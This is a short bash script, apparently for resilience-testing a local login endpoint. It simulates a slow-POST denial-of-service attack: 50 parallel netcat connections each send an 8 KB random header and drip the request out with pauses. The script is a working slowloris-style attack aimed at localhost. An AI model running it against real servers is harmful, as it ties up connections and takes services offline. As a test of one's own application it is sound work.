#!/bin/bash

echo "🔥 LONG-HEADER SLOW POST SIMULATION"

HOST="localhost"
PORT=3000

# Create long header value
LONG_HEADER=$(head -c 8192 </dev/urandom | base64 | tr -d '\n')

for i in {1..50}; do
(
  {
    echo -e "POST /auth/login HTTP/1.1\r";
    echo -e "Host: $HOST\r";
    echo -e "Content-Type: application/json\r";
    echo -e "X-Slow-Header: $LONG_HEADER\r";
    echo -e "Content-Length: 40\r";
    sleep 2;
    echo -e "\r";
    sleep 2;
    echo -e "{\"email\":\"slow@test.com\",\"password\":\"x\"}\r";
  } | nc $HOST $PORT
) &
done

wait
echo "✅ Long-header slow POST complete"
